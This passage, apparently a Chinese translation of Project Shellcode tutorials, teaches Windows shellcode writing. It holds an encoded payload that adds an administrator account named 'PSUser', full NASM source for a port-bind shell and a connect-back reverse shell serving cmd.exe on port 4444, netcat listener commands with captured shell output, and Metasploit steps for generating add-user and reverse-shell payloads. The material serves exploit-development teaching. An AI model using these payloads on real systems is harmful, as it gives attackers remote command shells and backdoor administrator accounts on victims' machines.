    \xe9\x9b\x00\x00\x00\x56\x31\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0f\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xe9\x09\x00\x00\x00\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x81\xc4\x08\x00\x00\x00\x81\xc7\x04\x00\x00\x00\x39\xce\x75\xe6\xc3\xe8\x19\x00\x00\x00\x98\xfe\x8a\x0e\x7e\xd8\xe2\x73\x81\xec\x08\x00\x00\x00\x89\xe5\xe8\x58\xff\xff\xff\x89\xc2\xeb\xe2\x5e\x8d\x7d\x04\x89\xf1\x81\xc1\x08\x00\x00\x00\xe8\xb6\xff\xff\xff\xeb\x0e\x5b\x31\xc0\x50\x53\xff\x55\x04\x31\xc0\x50\xff\x55\x08\xe8\xed\xff\xff\xff\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x50\x53\x55\x73\x65\x72\x20\x50\x53\x50\x61\x73\x73\x77\x64\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x50\x53\x55\x73\x65\x72

```

创建 adduser-dynamic.shellcodetest.c

把adduser-dynamic.shellcodetest.c编译成adduser-dynamic.shellcodetest.c

完成.你现在可以执行./adduser-dynamic.shellcodetest[.exe]了

玩的开心!

    Ty Miller     www.projectshellcode.com

现在应该准备测试shellcode 测试shellcode 在运行这个程序之前我们通过以下命令列出在你本地系统上的账户:

    # net user     (lists the local accounts on your system)

你现在应该可以通过测试程序执行你的shellcode”./adduser-dynamic.shellcodetest 创建的这个shellcode把一个命名为”PSUser”具有管理员权限的用户添加到你的系统上,然后应该干净利索地退出

    # ./adduser-dynamic.shellcodetest     The command completed successfully.     (adds a user account)     The command completed successfully.     (adds the user account to the administrators group)     (then exists cleanly)

我们现在使用命令再次确认用户是否已经被创建了，如下所示：

> net user     (lists the local accounts, now including "PSUser")

清理

你应该确保你已经把这个账户从你的系统中删除了,以防这个账户不被他人使用而把你的系统黑了.使用如下命令:

> net user PSUser /delete     The command completed successfully.     (deletes the "PSUser" account)

恭喜！

你已经创建了shellcode,它可以自动找到我们需要的Kernel32.dll和windows函数的内存地址.然后shellcode使用这些函数地址来执行函数以在本地系统上添加一个具有管理员权限的账户你现在可以写出跨多种不同windows系统的可移植的shellcode了！但是学习不能只停留在这里！我们现在需要知道怎样创建网络连接以使一个远程攻击者可以在受危害的系统上执行命令.这将会在下一个教程提及

0x06 端口绑定shellcode
=====

这个教程提供了关于网络shellcode的介绍.这种shellcode示范了动态加载库，和在那些库中找到函数地址的方法.然后着手实现了”Port Bind”shellcode,它建立了一个用于监听的socket使远程攻击者与本地命令提示符相连接.

> A lot of the code was pulled and learned from the following awesome paper with some slight modifications.

大量的代码都是从下面出色的paper中摘取出来的（带了点略微的修改）

- http://www.hick.org/code/skape/papers/win32-shellcode.pdf 我们的目的

The first stage of this shellcode will perform the same steps as the previous tutorial, where Kernel32.dll is located and functions located. In this case the following functions will be required:

这个shellcode的第一个阶段将完成和前面的教程一样的步骤,已经把Kernel32.dll和函数定位好了.在这个情况下，将会需要如下的函数

    - LoadLibraryA

    - CreateProcessA

    - ExitProcess

这个进程主要的不同是我们需要找到网络函数,它不在Kernel32.dll中.这意味着我们需要使用LoadLibraryA加载”ws2_32.dll”,它里面包含有如下我们想调用的函数：

    - WSASocketA

    - bind

    - socket

    - accept

    - WSAStartup

需要为所有这些函数创建函数hash,这已经在之前的教程中演示了。

这些网络函数中的每一个函数都将被用于安装一个监听的端口,它准备接受连接.一旦攻击者做好了连接,它们的客户端socket被连接到一个新的命令shell进程,这使得攻击者可以发送远程命令到系统中

我们需要WSAStartup和ExitProcess函数吗？

WSAStartup函数被使用于在一个进程中初始化网络服务.如果我们的”shellcodetest”程序没有网络连接那么我们需要从我们的shellcode中调用这个函数.

如果shellcode被包含在一个exploit中,它对已经初始化了网络的进程（例如网络浏览器,iis或Apache）进行exploit之后这个函数可能被忽略以让shellcode变得更小.

同样如果大小限制的严格ExitProcess函数可能也会被忽略.主进程将挂起

If either of these are taken out then you also need to update the "hash list length" within the shellcode for ws2_32 and Kernel32, respectively. This is noted in the shellcode below.

如果这些函数都被除去了,那么你需要在ws2_32和Kernel32的shellcode内各自地更新”hash list length”,记住如下shellcode

The Shellcode

```
+--------------- Start portbind.asm --------------+
;portbind.asm
[SECTION .text]
BITS 32
global _start
_start:
    jmp start_asm
;DEFINE FUNCTIONS
;FUNCTION: find_kernel32
find_kernel32:
    push esi
    xor eax, eax
    mov eax, [fs:eax+0x30]
    test eax, eax
    js find_kernel32_9x
find_kernel32_nt:
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov eax, [eax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov eax, [eax + 0x34]
    lea eax, [eax + 0x7c]
    mov eax, [eax + 0x3c]
find_kernel32_finished:
    pop esi
    ret
;END FUNCTION: find_kernel32
;FUNCTION: find_function
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    
compute_hash:
    xor edi, edi
    xor eax, eax
    cld
compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret
    
;END FUNCTION: find_function
;FUNCTION: resolve_symbols_for_dll
resolve_symbols_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp, 0x08
    add edi, 0x04
    cmp esi, ecx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret
;END FUNCTION: resolve_symbols_for_dll
;DEFINE CONSTANTS
    
locate_kernel32_hashes:
    call locate_kernel32_hashes_return
    ;LoadLibraryA
    db 0x8e
    db 0x4e
    db 0x0e
    db 0xec
    ;CreateProcessA
    db 0x72
    db 0xfe
    db 0xb3
    db 0x16
    ;ExitProcess
    db 0x7e
    db 0xd8
    db 0xe2
    db 0x73
;locate_ws2_32_hashes:
    ;WSASocketA
    db 0xd9
    db 0x09
    db 0xf5
    db 0xad
    ;bind
    db 0xa4
    db 0x1a
    db 0x70
    db 0xc7
    ;socket
    db 0xa4
    db 0xad
    db 0x2e
    db 0xe9
    ;accept
    db 0xe5
    db 0x49
    db 0x86
    db 0x49
    ;WSAStartup
    db 0xcb
    db 0xed
    db 0xfc
    db 0x3b
;END DEFINE CONSTANTS
start_asm: ; start our main program
    sub esp, 0x08 ; allocate space on stack for function addresses
    mov ebp, esp ; set ebp as frame ptr for relative offset on stack
    call find_kernel32 ;find address of Kernel32.dll
    mov edx, eax
    ;resolve kernel32 symbols
    jmp short locate_kernel32_hashes ;locate address of our hashes
locate_kernel32_hashes_return: ;define return label to return to this code
    pop esi ;get constants address from stack
    lea edi, [ebp + 0x04] ;this is where we store our function addresses
    mov ecx, esi
    add ecx, 0x0C ;length of kernel32 hash list
    call resolve_symbols_for_dll
    ;resolve ws2_32 symbols
add ecx, 0x14 ;length of ws2_32 hash list
    ;create the string ws2_32 on the stack
xor eax, eax
mov ax, 0x3233
push eax
push dword 0x5f327377
mov ebx, esp ;ebx now points to "ws2_32"
push ecx
push edx
push ebx
call [ebp + 0x04] ;call LoadLibraryA(ws2_32)
pop edx ;edx now holds location of ws2_32.dll
pop ecx
mov edx, eax
call resolve_symbols_for_dll
initialize_cmd: ;push the string "cmd" onto the stack
    mov eax, 0x646d6301
    sar eax, 0x08
    push eax
    mov [ebp + 0x34], esp
WSAStartup: ;initialise networking
    xor edx,edx ;make some stack space
    mov dh, 0x03 ;sizeof(WSADATA) is 0x190
    sub esp, edx     ;initialize winsock
    push esp ;use stack for WSADATA
    push 0x02 ;wVersionRequested
    call [ebp + 20h] ;call WSAStartup
    add esp, 0x0300 ;move esp over WSAData
create_socket:
    xor eax, eax ;zero eax
    push eax ;Push the dwFlags argument to WSASocket as 0.
    push eax ;Push the g argument to WSASocket as 0.
    push eax ;Push the lpProtocolInfo argument to WSASocket as NULL.
    push eax ;Push the protocol argument to WSASocket as 0.
    inc eax ;Increment eax to 1.
    push eax ;Push the type argument to WSASocket as SOCK STREAM.
    inc eax ;Increment eax to 2.
    push eax ;Push the af argument to WSASocket as AF INET.
    call [ebp + 0x10] ;Call WSASocket to allocate a socket for later use.
    mov esi, eax ;Save the socket file descriptor in esi.
bind:
    xor eax, eax ;Zero eax for use as passing zerod arguments
    xor ebx, ebx ;Zero ebx.
    push eax ;Push zero.
    push eax ;Push zero.
    push eax ;Push the sin addr attribute of struct sockaddr in.
    mov eax, 0x5c110102 ;Set the high order bytes of eax to the port that is to be bound to and the low order bytes to AF INET.
    dec ah ;Fix the sin family attribute such that it is set appropriately.
    push eax ;Push the sin port and sin family attributes.
    mov eax, esp ;Set eax to the pointer to the initialized struct sockaddr in structure.
    mov bl, 0x10 ;Set the low order byte of ebx to 0x10 to signify the size of the structure.
    push ebx ;Push the namelen argument as 0x10.
    push eax ;Push the name argument as the pointer to the struct sockaddr in structure.
    push esi ;Push the file descriptor that was returned from WSASocket
    call [ebp + 0x14] ;Call bind to bind to the selected port.
listen:
    push ebx ;Push 0x10 for use as the backlog argument to listen.
    push esi ;Push the file descriptor that was returned from WSASocket.
    call [ebp + 0x18] ;Call listen to begin listening on the port that was just bound to.
accept:
    push ebx ;Push 0x10 onto the stack.
    mov edx, esp ;Save the pointer to 0x10 in edx.
    sub esp, ebx ;Allocate 16 bytes of stack space for use as the output addr to the accept call.
    mov ecx, esp ;Save the pointer to the output buffer in ecx.
    push edx ;Push the addrlen argument as the pointer to the 0x10 on the stack.
    push ecx ;Push text addr argument as the pointer to the output struct sockaddr in on the stack
    push esi ;Push the file descriptor that was returned by WSASocket.
    call [ebp + 0x1c] ;Call accept and wait for a client connection to arrive. The client connection will be used for the redirected output from the command interpreter.
    mov esi, eax ;Save the client file descriptor in esi.
initialize_process:
    xor ecx, ecx ;Zero ecx.
    mov cl, 0x54 ;Set the low order byte of ecx to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS INFORMATION structures on the stack.
    sub esp, ecx ;Allocate stack space for the two structures.
    mov edi, esp ;Set edi to point to the STARTUPINFO structure.
    push edi ;Preserve edi on the stack as it will be modified by the following instructions.
zero_structs:
    xor eax, eax ;Zero eax to for use with stosb to zero out the two structures.
    rep stosb ;Repeat storing zero at the buffer starting at edi until ecx is zero.
    pop edi ;Restore edi to its original value.
initialize_structs:
    mov byte[edi], 0x44 ;Set the cb attribute of STARTUPINFO to 0x44 (the size of the structure).
    inc byte[edi + 0x2d] ;Set the STARTF USESTDHANDLES flag to indicate that the hStdInput, hStdOutput, and hStdError attributes should be used.
    push edi ;Preserve edi again as it will be modified by the stosd.
    mov eax, esi ;Set eax to the client file descriptor that was returned by accept
    lea edi, [edi + 0x38] ;Load the effective address of the hStdInput attribute in the STARTUPINFO structure.
    stosd ;Set the hStdInput attribute to the file descriptor returned from accept.
    stosd ;Set the hStdOutput attribute to the file descriptor returned from accept.
    stosd ;Set the hStdError attribute to the file descriptor returned from accept.
    pop edi ;Restore edi to its original value.
execute_process:
    xor eax, eax ;Zero eax for use with passing zerod arguments.
    lea esi, [edi + 0x44] ;Load the effective address of the PROCESS INFORMATION structure into esi.
    push esi ;Push the pointer to the lpProcessInformation structure.
    push edi ;Push the pointer to the lpStartupInfo structure.
    push eax ;Push the lpStartupDirectory argument as NULL.
    push eax ;Push the lpEnvironment argument as NULL
    push eax ;Push the dwCreationFlags argument as 0.
    inc eax ;Increment eax to 1.
    push eax ;Push the bInheritHandles argument as TRUE due to the fact that the client needs to inherit the socket file descriptor.
    dec eax ;Decrement eax back to zero.
    push eax ;Push the lpThreadAttributes argument as NULL.
    push eax ;Push the lpProcessAttributes argument as NULL.
    push dword [ebp + 0x34] ;Push the lpCommandLine argument as the pointer to cmd.
    push eax ;Push the lpApplicationName argument as NULL.
    call [ebp + 0x08] ;Call CreateProcessA to created the child process that has its input and output redirected from and to the remote machine via the TCP connection.
exit_process:
    call [ebp + 0x0c] ;Call ExitProcess as the parent no longer needs to execute
+--------------- End portbind.asm --------------+

```

编译汇编代码

> ./shellcode-compiler.sh portbind.asm

你现在可以使用下面的”shellcode-compiler.sh”命令来编译这个shellcode并自动化地创建一个用于测试的可执行程序,你应该已经下载好了在教程1中的这个脚本和任意其他必须的脚本和程序 .

把portbind.asm编译成portbind.bin

```
[nasm -f bin -o portbind.bin portbind.asm]
    Converting portbind.bin to portbind.shellcode
[./xxd-shellcode.sh portbind.asm]
    \xXX\xXX\xXX\xXX\xXX...[snip]...\xXX\xXX\xXX\xXX\xXX
    Creating portbind.shellcodetest.c
    
    Compiling portbind.shellcodetest.c to portbind.shellcodetest[.exe]
[gcc -o portbind.shellcodetest portbind.shellcodetest.c]
    
    Complete. You can now execute ./portbind.shellcodetest[.exe]
    
    Enjoy,
    Ty Miller
    www.projectshellcode.com

```

You should now be ready to test the shellcode.

你现在应该准备测试shellcode了

Testing the shellcode

Before we run this program, we want to show that our port 4444/TCP is not currently listening on your local system by running the following command:

在我们运行这个程序之前,我们想通过运行一下命令证实在你本地系统上4444/tcp端口不是当前正在监听的端口

     netstat -an | grep 4444     (should return nothing listening)

现在你应该可以通过test程序执行你的shellcode了”./portbind.shellcodetest”.shellcode被设计来建立一个端口是4444的监听器,它等待一个连接然后重定向那个连接到”cmd.exe”,然后主程序将干净利索地退出

     ./portbind.shellcodetest     (it should sit there waiting for a client to connect)

你现在打开二个bash终端同时不是用telnet就是用netcat来与这个端口相连接,正如下所示：

     nc -v localhost 4444     Microsoft Windows XP [Version 5.1.2600]     (C) Copyright 1985-2001 Microsoft Corp.          C:\Documents and Settings\Administrator>

如果你看到一个windows命令提示符那么你已经成功了

整理

你应该确保你已经杀掉了任意portbind进程（不是使用在cygwin中的kill程序就是使用Windows Task Manger） 恭喜！

你已经创建了加载ws2_32.dll的shellcode,在受危害的平台上初始化网络服务,之后安装一个反向连接到受害者的后门监听器,让它重定向连接到命令提示符上.

你现在可以准备写网络shellcode了！下一步是创建”Connectback”shellcode（初始化一个返回到攻击者的连接）.这将会在下一个教程中提及到.

0x07 网络的介绍
=====

这个教程使你的shellcode可以从受害者机器中反向和攻击者建立连接.这种shellcode和在前面的教程中绑定端口的shellcode很相似,带着一些相对小的改变允许你的shellcode反向连接到攻击者.攻击者的机器这次也将使用netcat来安装一个反向连接shellcode的监听器以便可以获取远程命令提示符.

> A lot of the code was pulled and learned from the following awesome paper with some slight modifications.

学习了下面不错的paper并从中抽取了大量代码（带有略微修改）     - http://www.hick.org/code/skape/papers/win32-shellcode.pdf     (Project Shellcode Download:http://projectshellcode.com/downloads/http___||||www.hick.org_code_skape_pap...)

Our Aim

我们的目的

这个shellcode的第一个阶段将完成和前面的教程一样的步骤,已经把Kernel32.dll和函数定位好了.这个情况下，将会需要如下的函数

    - LoadLibraryA

    - CreateProcessA

    - ExitProcess

这个进程主要的不同是我们不再需要bind socket或accept函数了,改为只使用连接网络的函数,但是它没有在Kernel32.dll中被定位.这意味着我们需要使用LoadLibraryA加载”ws2_32.dll”,它里面包含有如下我们想调用的函数：

    - WSASocketA

    - connect

    - WSAStartup

函数hash需要所有这些函数来创建,这在之前的教程中已经演示了

这些网络函数被用于在进程中启动网络,创建一个socket之后使用它在预定义的端口4444上来与攻击者的ip地址相连接

在发送exploit之前,攻击者应该安装一个在127.1.1.1端口：4444的netcat监听器来接受反向连接.一旦通过shellcode创建了连接,它们的客户端socket会被连接到一个新的命令shell进程上,它允许它们给系统发送远程命令

我们需要WSAStartup和ExitProcess?（为了没有完成之前的教程的你准备的）

WSAStartup函数被使用于在一个进程中初始化网络服务.因为我们的”shellcodetest”程序将不能连接网络,接着我们需要从我们的shellcode中调用这个函数。

如果在一个exploit中包含了这个shellcode,用它来exploit一个已经初始化了网络的进程（例如 Internet Explorer,IIS或Apache）那么这个函数会被遗漏以使shellcode体积更小.

类似地,如果大小限制太严格,那么ExitProcess函数也会被遗漏,同时主进程将会被挂起

如果一个函数都没有被除去,你需要在ws2_32和kernel32的shellcode内各自更新”hash list length”.需要记住以下shellcode：

Shellcode

```
+--------------- Start connectback.asm --------------+
;connectback.asm
[SECTION .text]
BITS 32
global _start
_start:
    jmp start_asm
;DEFINE FUNCTIONS
;FUNCTION: find_kernel32
find_kernel32:
    push esi
    xor eax, eax
    mov eax, [fs:eax+0x30]
    test eax, eax
    js find_kernel32_9x
find_kernel32_nt:
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov eax, [eax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov eax, [eax + 0x34]
    lea eax, [eax + 0x7c]
    mov eax, [eax + 0x3c]
find_kernel32_finished:
    pop esi
    ret
;END FUNCTION: find_kernel32
;FUNCTION: find_function
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    
compute_hash:
    xor edi, edi
    xor eax, eax
    cld
compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret
    
;END FUNCTION: find_function
;FUNCTION: resolve_symbols_for_dll
resolve_symbols_for_dll:
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp, 0x08
    add edi, 0x04
    cmp esi, ecx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret
;END FUNCTION: resolve_symbols_for_dll
;DEFINE CONSTANTS
    
locate_kernel32_hashes:
    call locate_kernel32_hashes_return
    ;LoadLibraryA
    db 0x8e
    db 0x4e
    db 0x0e
    db 0xec
    ;CreateProcessA
    db 0x72
    db 0xfe
    db 0xb3
    db 0x16
    ;ExitProcess
    db 0x7e
    db 0xd8
    db 0xe2
    db 0x73
;locate_ws2_32_hashes:
    ;WSASocketA
    db 0xd9
    db 0x09
    db 0xf5
    db 0xad
    ;connect
    db 0xec
    db 0xf9
    db 0xaa
    db 0x60
    ;WSAStartup
    db 0xcb
    db 0xed
    db 0xfc
    db 0x3b
;END DEFINE CONSTANTS
start_asm: ; start our main program
    sub esp, 0x68 ; allocate space on stack for function addresses
    mov ebp, esp ; set ebp as frame ptr for relative offset on stack
    call find_kernel32 ;find address of Kernel32.dll
    mov edx, eax
    ;resolve kernel32 symbols
    jmp short locate_kernel32_hashes ;locate address of our hashes
locate_kernel32_hashes_return: ;define return label to return to this code
    pop esi ;get constants address from stack
    lea edi, [ebp + 0x04] ;this is where we store our function addresses
    mov ecx, esi
    add ecx, 0x0C ;length of kernel32 hash list
    call resolve_symbols_for_dll
    ;resolve ws2_32 symbols
add ecx, 0x0C ;length of ws2_32 hash list
    ;create the string ws2_32 on the stack
xor eax, eax
mov ax, 0x3233
push eax
push dword 0x5f327377
mov ebx, esp ;ebx now points to "ws2_32"
push ecx
push edx
push ebx
call [ebp + 0x04] ;call LoadLibraryA(ws2_32)
pop edx ;edx now holds location of ws2_32.dll
pop ecx
mov edx, eax
call resolve_symbols_for_dll
initialize_cmd: ;push the string "cmd" onto the stack
    mov eax, 0x646d6301
    sar eax, 0x08
    push eax
    mov [ebp + 0x30], esp
WSAStartup: ;initialise networking
    
    xor edx,edx ;make some stack space
    mov dh, 0x03 ;sizeof(WSADATA) is 0x190
    sub esp, edx
     ;initialize winsock
    push esp ;use stack for WSADATA
    push 0x02 ;wVersionRequested
    call [ebp + 18h] ;call WSAStartup
    add esp, 0x0300 ;move esp over WSAData
;SECTION: start custom shellcode
create_socket: ;same as portbind
    xor eax, eax ;zero eax
    push eax ;Push the dwFlags argument to WSASocket as 0.
    push eax ;Push the g argument to WSASocket as 0.
    push eax ;Push the lpProtocolInfo argument to WSASocket as NULL.
    push eax ;Push the protocol argument to WSASocket as 0.
    inc eax ;Increment eax to 1.
    push eax ;Push the type argument to WSASocket as SOCK STREAM.
    inc eax ;Increment eax to 2.
    push eax ;Push the af argument to WSASocket as AF INET.
    call [ebp + 0x10] ;Call WSASocket to allocate a socket for later use.
    mov esi, eax ;Save the socket file descriptor in esi.
do_connect:
    push 0x0101017f ;Push the address of the remote machine to connect to in network-byte order. In this case 127.1.1.1 has been used.
    mov eax, 0x5c110102 ;Set the high order bytes of eax to the port to connect to in networkbyte order (4444). The low order bytes should be set to the family, in this case AF INET3.
    dec ah ;Decrement the second byte of eax to get it to zero and have the family be correctly set to AF INET.
    push eax ;Push the sin port and sin family attributes.
    mov ebx, esp ;Set ebx to the pointer to the struct sockaddr in that has been initialized on the stack.
    xor eax, eax ;Zero eax.
    mov al, 0x10 ;Set the low order byte of eax to 16 to represent the size of the struct sockaddr in.
    push eax ;Push the namelen argument which has been set to 16.
    push ebx ;Push the name argument which has been set to the initialized struct sockaddr in on the stack.
    push esi ;Push the s argument as the file descriptor that was previously returned from WSASocket.
    call [ebp + 0x14] ;Call connect to establish a TCP connection to the remote machine on the specified port.
initialize_process:
    xor ecx, ecx ;Zero ecx.
    mov cl, 0x54 ;Set the low order byte of ecx to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS INFORMATION structures on the stack.
    sub esp, ecx ;Allocate stack space for the two structures.
    mov edi, esp ;Set edi to point to the STARTUPINFO structure.
    push edi ;Preserve edi on the stack as it will be modified by the following instructions.
zero_structs:
    xor eax, eax ;Zero eax to for use with stosb to zero out the two structures.
    rep stosb ;Repeat storing zero at the buffer starting at edi until ecx is zero.
    pop edi ;Restore edi to its original value.
initialize_structs:
    mov byte[edi], 0x44 ;Set the cb attribute of STARTUPINFO to 0x44 (the size of the structure).
    inc byte[edi + 0x2d] ;Set the STARTF USESTDHANDLES flag to indicate that the hStdInput, hStdOutput, and hStdError attributes should be used.
    push edi ;Preserve edi again as it will be modified by the stosd.
    mov eax, esi ;Set eax to the client file descriptor that was returned by accept
    lea edi, [edi + 0x38] ;Load the effective address of the hStdInput attribute in the STARTUPINFO structure.
    stosd ;Set the hStdInput attribute to the file descriptor returned from accept.
    stosd ;Set the hStdOutput attribute to the file descriptor returned from accept.
    stosd ;Set the hStdError attribute to the file descriptor returned from accept.
    pop edi ;Restore edi to its original value.
execute_process:
    xor eax, eax ;Zero eax for use with passing zerod arguments.
    lea esi, [edi + 0x44] ;Load the effective address of the PROCESS INFORMATION structure into esi.
    push esi ;Push the pointer to the lpProcessInformation structure.
    push edi ;Push the pointer to the lpStartupInfo structure.
    push eax ;Push the lpStartupDirectory argument as NULL.
    push eax ;Push the lpEnvironment argument as NULL
    push eax ;Push the dwCreationFlags argument as 0.
    inc eax ;Increment eax to 1.
    push eax ;Push the bInheritHandles argument as TRUE due to the fact that the client needs to inherit the socket file descriptor.
    dec eax ;Decrement eax back to zero.
    push eax ;Push the lpThreadAttributes argument as NULL.
    push eax ;Push the lpProcessAttributes argument as NULL.
    push dword [ebp + 0x30] ;Push the lpCommandLine argument as the pointer to cmd. Only change in this section to portbind.
    push eax ;Push the lpApplicationName argument as NULL.
    call [ebp + 0x08] ;Call CreateProcessA to created the child process that has its input and output redirected from and to the remote machine via the TCP connection.
exit_process:
    call [ebp + 0x0c] ;Call ExitProcess as the parent no longer needs to execute
+--------------- End connectback.asm --------------+

```

编译汇编代码

你现在可以使用如下”shellcode-compiler.sh”命令编译这个shellcode并自动化成创建一个测试的可执行程序.你应该在教程1中已经下载好这个脚本和所有其他需要的脚本和程序了.应该得到类似于如下的输出（取决于你手头的shellcode-compiler.sh脚本的版本）

$ ./shellcode-compiler.sh connectback.asm

  把 connectback.asm 编译 connectback.bin

    [nasm -f bin -o connectback.bin connectback.asm

把connectback.bin转换成connectback.shellcode

    [./xxd-shellcode.sh connectback.asm]

    \xXX\xXX\xXX\xXX\xXX...[snip]...\xXX\xXX\xXX\xXX\xXX

创建 connectback.shellcodetest.c

   把 connectback.shellcodetest.c 编译成 connectback.shellcodetest[.exe]

    [gcc -o connectback.shellcodetest connectback.shellcodetest.c]

    完成.你现在可以执行./connectback.shellcodetest[.exe]

玩的开心,

    Ty Miller

    www.projectshellcode.com

现在你应该准备测试shellcode

测试shellcode

在我运行这个程序前我想在127.1.1.1端口：4444/tcp上安装一个netcat监听器.在你的本地系统上的一个新的cygwinbashshell中运行如下命令

    nc -l -s 127.1.1.1 -p 4444 -n -v

     listening on [127.1.1.1] 4444 ...

在你最初的cygwinbashwindows中,你现在应该可以通过测试程序执行你的shellcode了.”./connectback.shellcodetest”.shellcode被设计来连接 到我们的在127.1.1.1端口4444/tcp上的监听器,之后重定向连接到”cmd.exe”然后主程序应该干净利索地退出

./connectback.shellcodetest     (it should simply exit cleanly

它应该仅仅是干净利索地退出

在你的第二个cygwin窗口中你应该已经接收到了连接,同时也被重定向到一个windows命令提示符,这或许会花去一段时间.

     nc -l -s 127.1.1.1 -p 4444 -n -v      listening on [127.1.1.1] 4444 ...      connect to [127.1.1.1] from (UNKNOWN) [127.1.1.1] 1758     Microsoft Windows XP [Version 5.1.2600]     (C) Copyright 1985-2001 Microsoft Corp.          C:\Documents and Settings\Administrator>

If you see a Windows command prompt then you have succeeded.

如果你看到了windows命令提示符那么你已经成功了

如果你还没有成功那么我、已经发现带有shellcode（含有网络连接）的shellcodetest程序在Cygwin环境下看起来运行的不是很理想.最新版的

shellcode-compiler.sh脚本自动化地生成一个利用Internet Explorer 漏洞 ms07-004 模板,它包含了已经被Unicode编码的shellcode.你可以试图在你的系统上卸载标有KB929969的补丁,然后在Internet Explorer中加载exploit模板

进行测试

整理

你应该确保你不是在cygwin中已经使用kill程序就是使用Windows Task Manager杀掉了所有在你机器上已经安装好的netcat监听器.

恭喜！

你仅仅已经创建了加载ws2_32.dll的shellcode,初始化网络,接着反向连接到一个后门监听器上,然后被重定向连接到受危害的系统上的一个命令提示符

0x08 使用MSF生成shellcode
=====

Metasploit是一个开源的exploit框架,它为你提供了exploits的堆,也提供了协助你创建自己exploit的工具.它可以为不同目的和平台生成大范围的shellcode,同时可以自定义这些shellcode来攻击你的目标

这个教程是关于使用Metasploit Framework生成shellcode的介绍

我们的目的

开始我们将简要地看看Metasploit提供的web接口并使用最简单的方法用Metasploit生成shellcode.我们将使用这个接口生成如下shellcode：

    - linux/x86/adduser/bind_tcp

大多数教程集中于对Metasploit的命令行接口的介绍，因为这些将被用于以后的教程中.我们将使用命令行生成不同格式的shellcode,它们包括raw,unicode,和像一个windows那样的可执行程序的格式

    - osx/ppc/shell_reverse_tcp

    - solaris/x86/shell_find_port

    - windows/exec

这里也将示范把Solaris的shellcode插入到一个exploit中的方法.

Metasploit的安装过程已经添加到”shellcode教程1：介绍和工具的安装”了.

Metasploit Web Interface (生成linux shellcode)

为了访问Metasploit Web接口,运行如下程序将会在http://127.0.0.1:55555上开始运行”msfweb”

    - C:\msf3\msfweb.bat

这在下图中有演示:

![enter image description here](http://drops.javaweb.org/uploads/images/d161340bab26358681ba76b0a96c7b36fa83696e.jpg)

在工具栏的顶部点击”Payloads”来获取Metasploit Web接口生成shellcode的特性.现在应该在下面的屏幕中看看可以生成的有效的payloads有哪些:

![enter image description here](http://drops.javaweb.org/uploads/images/5c0daadf71a178b8d1bce14a5d3e586cfb1b3e4d.jpg)

我们想使用这个接口生成如下shellcode:

*   linux/x86/adduser/bind_tcp

在搜索区内输入”add user”(没有引号）,同时应该看到一堆可以把一个用户账户添加到一个系统中的payloads.通过点击payload标题选择”Linux Add User”payload.

可以在如下图中那样配置你想让你shellcode执行的参数,包括用于创建的用户名,与用户名相对应的密码,和你想让这个用户使用的shell.

